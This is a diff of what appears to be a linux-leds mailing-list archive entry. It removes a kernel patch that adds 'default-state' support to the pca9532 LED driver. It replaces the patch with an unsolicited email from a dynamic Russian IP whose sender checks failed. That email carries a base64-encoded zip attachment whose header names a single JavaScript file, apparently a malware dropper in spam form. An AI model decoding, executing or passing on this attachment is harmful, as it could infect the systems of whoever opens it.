@@ -1,132 +1,86 @@
-From: Felix Brack <fb@ltec.ch>
-Subject: [PATCH v3] leds: pca9532: Extend pca9532 device tree support
-Date: Thu, 13 Apr 2017 09:51:38 +0200
-Message-ID: <1492069898-19920-1-git-send-email-fb@ltec.ch>
+From: <office@franztextilmanufaktur.com>
+Subject: 15195 linux-leds
+Date: Fri, 14 Apr 2017 18:56:26 -0000
+Message-ID: <149219618668.10872.3247027587501155310@ugratel.ru>
+Reply-To: <office@franztextilmanufaktur.com>
+Mime-Version: 1.0
+Content-Type: application/zip; name="27000.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-leds-owner@vger.kernel.org>
-Received: from mail.ltec.ch ([95.143.48.181]:52497 "EHLO mail.ltec.ch"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1756166AbdDMHwO (ORCPT <rfc822;linux-leds@vger.kernel.org>);
-        Thu, 13 Apr 2017 03:52:14 -0400
+Received: from dynamicip-37.200.88.126.ugratel.ru ([37.200.88.126]:55155 "HELO
+        ugratel.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1754536AbdDNS4a (ORCPT <rfc822;linux-leds@vger.kernel.org>);
+        Fri, 14 Apr 2017 14:56:30 -0400
+Content-Disposition: attachment
 Sender: linux-leds-owner@vger.kernel.org
 List-Id: linux-leds@vger.kernel.org
-To: jacek.anaszewski@gmail.com, pavel@ucw.cz, rpurdie@rpsys.net, riku.voipio@iki.fi, linux-leds@vger.kernel.org
-Cc: linux-kernel@vger.kernel.org, fb@ltec.ch
+To: linux-leds <linux-leds@vger.kernel.org>
 
-This patch extends the device tree support for the pca9532 by adding
-the leds 'default-state' property.
-
-Signed-off-by: Felix Brack <fb@ltec.ch>
----
- .../devicetree/bindings/leds/leds-pca9532.txt      | 10 ++++++++
- drivers/leds/leds-pca9532.c                        | 27 +++++++++++++++++++++-
- include/linux/leds-pca9532.h                       |  4 ++--
- 3 files changed, 38 insertions(+), 3 deletions(-)
-
-diff --git a/Documentation/devicetree/bindings/leds/leds-pca9532.txt b/Documentation/devicetree/bindings/leds/leds-pca9532.txt
-index 198f3ba..f769c52 100644
---- a/Documentation/devicetree/bindings/leds/leds-pca9532.txt
-+++ b/Documentation/devicetree/bindings/leds/leds-pca9532.txt
-@@ -17,6 +17,8 @@ Optional sub-node properties:
- 	- label: see Documentation/devicetree/bindings/leds/common.txt
- 	- type: Output configuration, see dt-bindings/leds/leds-pca9532.h (default NONE)
- 	- linux,default-trigger: see Documentation/devicetree/bindings/leds/common.txt
-+	- default-state: see Documentation/devicetree/bindings/leds/common.txt
-+	  This property is only valid for sub-nodes of type <PCA9532_TYPE_LED>.
- 
- Example:
-   #include <dt-bindings/leds/leds-pca9532.h>
-@@ -33,6 +35,14 @@ Example:
-       label = "pca:green:power";
-       type = <PCA9532_TYPE_LED>;
-     };
-+    kernel-booting {
-+      type = <PCA9532_TYPE_LED>;
-+      default-state = "on";
-+    };
-+    sys-stat {
-+      type = <PCA9532_TYPE_LED>;
-+      default-state = "keep"; // don't touch, was set by U-Boot
-+    };
-   };
- 
- For more product information please see the link below:
-diff --git a/drivers/leds/leds-pca9532.c b/drivers/leds/leds-pca9532.c
-index 06e6310..7fea18b 100644
---- a/drivers/leds/leds-pca9532.c
-+++ b/drivers/leds/leds-pca9532.c
-@@ -254,6 +254,21 @@ static void pca9532_input_work(struct work_struct *work)
- 	mutex_unlock(&data->update_lock);
- }
- 
-+static enum pca9532_state pca9532_getled(struct pca9532_led *led)
-+{
-+	struct i2c_client *client = led->client;
-+	struct pca9532_data *data = i2c_get_clientdata(client);
-+	u8 maxleds = data->chip_info->num_leds;
-+	char reg;
-+	enum pca9532_state ret;
-+
-+	mutex_lock(&data->update_lock);
-+	reg = i2c_smbus_read_byte_data(client, LED_REG(maxleds, led->id));
-+	ret = reg >> LED_NUM(led->id)/2;
-+	mutex_unlock(&data->update_lock);
-+	return ret;
-+}
-+
- #ifdef CONFIG_LEDS_PCA9532_GPIO
- static int pca9532_gpio_request_pin(struct gpio_chip *gc, unsigned offset)
- {
-@@ -366,7 +381,10 @@ static int pca9532_configure(struct i2c_client *client,
- 			gpios++;
- 			break;
- 		case PCA9532_TYPE_LED:
--			led->state = pled->state;
-+			if (pled->state == PCA9532_KEEP)
-+				led->state = pca9532_getled(led);
-+			else
-+				led->state = pled->state;
- 			led->name = pled->name;
- 			led->ldev.name = led->name;
- 			led->ldev.default_trigger = pled->default_trigger;
-@@ -456,6 +474,7 @@ pca9532_of_populate_pdata(struct device *dev, struct device_node *np)
- 	const struct of_device_id *match;
- 	int devid, maxleds;
- 	int i = 0;
-+	const char *state;
- 
- 	match = of_match_device(of_pca9532_leds_match, dev);
- 	if (!match)
-@@ -475,6 +494,12 @@ pca9532_of_populate_pdata(struct device *dev, struct device_node *np)
- 		of_property_read_u32(child, "type", &pdata->leds[i].type);
- 		of_property_read_string(child, "linux,default-trigger",
- 					&pdata->leds[i].default_trigger);
-+		if (!of_property_read_string(child, "default-state", &state)) {
-+			if (!strcmp(state, "on"))
-+				pdata->leds[i].state = PCA9532_ON;
-+			else if (!strcmp(state, "keep"))
-+				pdata->leds[i].state = PCA9532_KEEP;
-+		}
- 		if (++i >= maxleds) {
- 			of_node_put(child);
- 			break;
-diff --git a/include/linux/leds-pca9532.h b/include/linux/leds-pca9532.h
-index d215b45..5e240b2 100644
---- a/include/linux/leds-pca9532.h
-+++ b/include/linux/leds-pca9532.h
-@@ -22,7 +22,8 @@ enum pca9532_state {
- 	PCA9532_OFF  = 0x0,
- 	PCA9532_ON   = 0x1,
- 	PCA9532_PWM0 = 0x2,
--	PCA9532_PWM1 = 0x3
-+	PCA9532_PWM1 = 0x3,
-+	PCA9532_KEEP = 0xff,
- };
- 
- struct pca9532_led {
-@@ -44,4 +45,3 @@ struct pca9532_platform_data {
- };
- 
- #endif /* __LINUX_PCA9532_H */
--
--- 
-2.7.4
+UEsDBBQAAgAIAAQFj0pYI2c0cw4AAGchAAAIABwAMzIyNzMuanNVVAkAA4gX8ViFF/FYdXgLAAEE
+AAAAAAQAAAAAjVltU9vGFv7Or9hhmLFSO4BtXpzLMHcMgUKHAI2d0kSlnZW0sreWVppdCeN08t/v
+c3Ylx1JJcjvTBPY8OufseT+bvZ9YKlRh2HIuFMvLIJEh40WBM5kpJg3LwrDMpYjYUhZzlhVzoVkx
+l2pmGPtpb2srLlVosVOuvM89JvaHgx6LZfGK/bPF8N9Uy5Sd0on/+fHEHmlRlFpZysnWF7b3U4vV
+A1eFd5klUY/JaPgXMT18U/O7uZ5MwY+OfMI0eRL1RZ4TIbyEK7A0pRY9Nj+qGb69e7gFw/mRT/Qm
+O6KB3dbW3h4bq4itRIHbCxZmpTaCZTETT85+3LAiYwVfCMZZJONYaBAYcdllG3pEOsu9IMuSHru/
+ux+SOrUiYn90AEVM6RO9qQjRSJEnrllqFGCdh0moZV7sTuYiSTondOVCC07XM6TZHN5TnITusumc
+F0wW5NBci1AakazsRWQkeMLCMoEU0TLZneaJF3Ope2ymeQBVC65rZS8KUhUHPiGayl4UlQtSIQqE
+So9l4AG1cgHOT5DdIwWhCRnPAoIVjGZ0mZNkuL1oh9ds4I1v3/bY1fTdTY+9O6v1KGRuoMm7Mx/k
+phpEss7buFHk5dmC99iHcY9NPk6mNZu43x+ADR35hGhyImp1JS1SLhV0pp8UApVNCl7A6YgB+IH+
+JruWysz5ggeJYBHZ296qeaNlsvTOkSpkjVjzWa1KLRNH/vljJdaU4ZxFXM2E3mWXGeWggMkyprKC
+LTO9YB2VQUyy6jBEMetkweuWPNE/3vfi/uCox27KADYQ/cN1EqQc2X1qj3zCNO9P1DoNINhGfixD
+yRMDt0VWCakKoeFPmGIGCxlKFISbLRtkESVCYV5vpkJmnr37q/uDHrstE+TDw/3XTDg8hDYP9z7R
+25lweFgZZQq246Lg4YKN1zIF+02KJcXXjYwFGwyG7UjiJvfeSYUi8MEITcUqadteJj4hHutLByLM
+UtwskSiTyPO5TBtZHXBtPB3FPVb0UAmDr2aFZ07pxAe1bVS9qPlfSsUTpGRnrFdc/UTyOOT9XeJK
+nJmVytQqZTH83rlWUfb6Z6FTrnY7rOHf0YFnZM/GSo+Nk3UJzkudQAuc+EY2lSBSM0fG47E3z3os
+ByeRrS+CTKb4yPx51roGKPU1Nti8lYn0PqF2n8E9sDEPi7aRceR/+uuxKT4ORl6E4OSBQZp/aH3z
+7oMf8bVXVJkGaEdUSkSWI9Uo8gsqdRQGAjU4LBh4rrISQThHagYC/lNixhuBKPihV8Jx40kPXglr
+mfeIStwZJ35ZNC9NpCoIL56EXtmemeYFxUaus1DUDZMUQfYIjVyRn7mL+xieTBbSzFuRGa+8j8JQ
+uxuhMRR5Oyxx4gNQ14SzsqBYV4rb9kNJmCkEUZ4lspChDSiyCGVmksAWJR21y1AUee/P+/A3WUBn
+iViXRJ1R46YjH4hWRQSx6ThEkvAMT8Ali9BmzzArrFssmh5Y0ZFPkFaTBbV26QwFBG2nkVwfBdfe
+z7cfeixB8+ihoJp1LJ2BLf3ug97ketZU7yKShReEqMK8yFIUGww8NZMwoGKDAx+AJpcwqOs+t6MP
+R7Qoka7IiYUuBTO51JIsa00NBak1JGhsidltWdosZO69pUagl2ipa/GX8hnyZ8oHrSkdlLrpaxMB
+tH+yOXFlqSf2D95QJR/Bg0shFq2IoSOfMOucEdCyzKlNcdapIkVy1WEnLnNSwZVxPy4ksLgnKg3m
+wwxVfzNWNQaqNDpE4HB4O0KMt2TTkQ9EHa5xhmbpMhQDlC5DGePiPMiehD2ay9kcFRYjxS67Ejak
+ucbQUCCX6LOmMcMM4Sb6QygQoFp9lLV0o0MY6qP0idg0J0jNoOBzkXoFn6FMrWSKMSQWy5qPInvj
+d5/oTT4qqq50f3dzff6R3V2y8c3N9fj2/IKNL6cX79n06oI9jN+zN8N+uwvv948wiPbYzzaW5dpj
+ot9/A4lygTG01fFAqd2XcmOoRGBecp6CfzCcUegJHlHs5VqqUKIaAsWpZaSE2UzUKPa0mFHUHGMW
+QPialufoyAdkHTRSuWZu7Khjiwz1IkxpIkHPM4gyg5MscjRaJpABBGgIlkniiahEXefPGEJ41pKL
+Ex/0VkcIy8Kbw82IhJ6drNtxhiN/vg6zCAOaigzKvY7cZATtnaY2jEKuqFIivmOp0V4DGtYigR9J
+/6azrnjo5QlHzeS0M2Q6qmWTteEtnPgEaDqMiC+0RLF/9Ma7oCEW7bks1vcI3ggqQDjxL9ozLNGq
+i1GO1G2G01igMOaEmYKhTdVWCPKLWCIqtF1M7EF7ChweeeNfxr9TIYRBP2KTqRWR1O7owCdAUxGZ
+rIOhkFgwyJTOyRyQRM7shGvdD6FSUxucIXsNQjayCZ5u2sKURngqK/GNQuk6RwuotbiCEvS7T+Sm
+EleVKS5FRF3Cjd6mwyaoIVrImSpWbDQ8aF359u72wlti04Gc+6ntr4NhK4joyCfM4wuOC2UhPBKB
+UF9S7q2XUWQetMWBT+SmsqDVw3soac/BxMwKwUPanndt94aNckzLKuK0mbk4JZcWdqfk7R3oSiQ5
+EkgW9gow26yU64hcBBSQdOITpKkLiPW9MDRrgeylHRjtq9CoQ3Z3DbA8LlwI8ZwrmvLd+lgbulH+
+8ZV3lxqMdkYq0udg9C+THox8grxk0tTMUAWXtnagG2NEaRcDOkIpXD6+uM7HsZdkxhriaIQYWjfT
+3ySZQSmfyE0jgFRrQqvaa1w4qifHZVYmtn3DJEIZGVSz09KuyvA5vJXKpDE2jjE63fT3cXszz3LU
+JlM8fN1gjo5oNMGRT5j2DnN01Cxy54VOvCimuYlL7EL5MmzZAyc+AC+bY4JWgFng+Bgt7OB4ZEfI
+43VHDOx7yejYJ0SrJQZNPQAbeVecWpOhOHtOk69bhB2HceIToL1HJK094pe761svR6MzicS1UF3X
+nATxoQM/b7e6r1UGrYxTLpgC41UVhin+1OF8RfWNyo57sNq1i2A4z2ToxobNxUwqLx4MkSvzQY89
+ya/9vZJIRz4hWl2HeqoXw7cB/l+obLnxSrMP9enIj//l19F+k82n63tPoW6MUWl53pKNE1/p2qPr
+sR3eQ7fFD6/TTNOvG28LtDRl2rb9IKGGRUGqeSjaY32WRFjj9OcewwqN7jmFwJZ4OvIJ017BhEi8
+Gkuz5xStl5LK+niTAc5rf2EqqbvQO/IRo/rUfzPEhBEKXWA7ZzzP4S1bUkzVrYx7gWq4DBMqxTK9
+U9xzTfu0eG7vjnTkE+axno/n3A1sPDHCvoXR9Ioihin8mp5qhFsVqT/BzEUinAYou4VMYb3YhhTm
+PWfHr+q8RzNvWOOXyR29Fw4apqDDWhUUvqPaXOtU3dhEVJMfgqZP7R9DSCyViNoR1a/5jiN66do+
+OO4fH2+fbMmYeU7UqRO2ydS+fZzaEWFs39x+vwv+xgropUa9chLoe6fL6Yb0mkmNsEJP12I3yTWk
+shBA+21yrc7b6du1c/4FIB4WcFpBXuJSc5oFjUh8CWLoQehfBn0JeSPV4ofspnMuATr4NuKayhmW
+wW8jRH+//32VvjROvqASIjf+edFWLtR/ZCyKAN/f1qXafvT3Hx893+6f+z22Pcml2u4xfztMo13x
+LNheyP7Y3n58xbru0ZdAuQgTC8qzJSZMemRmbCc+PBg6oF0ACfhZPjtup50/VZLxzsmOQ9h5lxD3
+SWksAtvdACgNyPuLiUPZ5zhCif7g2KKmgBgGTFCaFX5OpEPSyxQBY7jLqb9iZ6scGxGBw1OHmlRq
+jS8HBxYFZgvQzzU3YMYmK4ez/YmANwhfC8Smme7eimK3uuDKkn8TemXJD+uL2Td8oqHvF5aWqVCA
+eZZ83g2zFEDhkHbMJWRUBhbYPyYDxKfDSoj9pw4CzKSlz2Tc6fR2cl7MX53Q2NVxODuCWrfkzpRr
+I9M8TwTFZ5bw9JcKIMJR6YmAiNpJF0FIL5iFI1KLIGKpE8fz1e7bbAnlOQeDPfisciNGAsJx4Zjo
+3Xye/xc4WgdPKwXtBGKDC7OBxf356sS7Fcs6rJws1HxLfH2H7+nfHiBpfZPRgfNvfzBykQcrAJaW
+5LiJqNS2D03WpscHA+fhk50JFPnzP7QcdTudP/5wSGq+BFz1Lezs7u1HCvdOBx+oTIkqYuj5z/Lj
+Zl5FjK2VxHbhIPRWT5AEo5yFSAV5xet7nVWxGbn7YRd1oYm15GTnkyPat1AbL/LZ5QE+fj0Js1ww
+cAire9F6bG1U2bmyv325ovNl7sL0hK0j0Y6NRENbdT7UXGvifvFchSBNQC69Dlw+hPi6qIh2NSJq
+KkpHnONjO27VTjnedxE0C7hF3Fc3tm8nRDnnqvaCo9jRiSjBKHLfBMOIYtKG9am3I9RT56QKUO60
+M0HpwnfnVwCjS5kIr9OZF0Udg30X5dIxzKu70bM7HX9wjvvP3l4411kqOifsurqB3VSs+VLurP+U
+LQTsk9N2WmWCea6sqF0poD7tUeBV4mkkIUAVvd0dMnMXZgznXVumKlmxM3VaoT5xUIeRI9LKY68q
+XM0Iuojark2irg3HbmU/+7RFyFv+ZJFUuro7lNhdKsCVrMBl5SXqsEUNuzu/dnfC7k7tO/tuSpCn
+vIrJ7g6vRJQupKa/T11Adt05PXi4YBkdOXcgAAYVkR6OrBFqK1X6zgbO23pd43GzRVW0q7zA5jG0
+ZNWl0j/t2uR/dVKnql1tCfj33xZm2xH1rR69fL56oV9+q0PWXbKaYn/YJ+sW/WAfYQaDk++iouK7
+80INW/Jk8e2BpzE7FDTUvel/H4XBIfvxSFOjPwmd/V9qLsSK/iU5zT53XgZ++dGcsvVdf5CMd+Pz
+b2tOjrKAb0ygm4wup/c0/h4fDw9G2ycvQlIZyW9e3Fr73c/fNyOB4n6//23n2WWjSL/NZsMmW+7P
+L/8DUEsBAh4DFAACAAgABAWPSlgjZzRzDgAAZyEAAAgAGAAAAAAAAQAAAKSBAAAAADMyMjczLmpz
+VVQFAAOIF/FYdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEATgAAALUOAAAAAA==
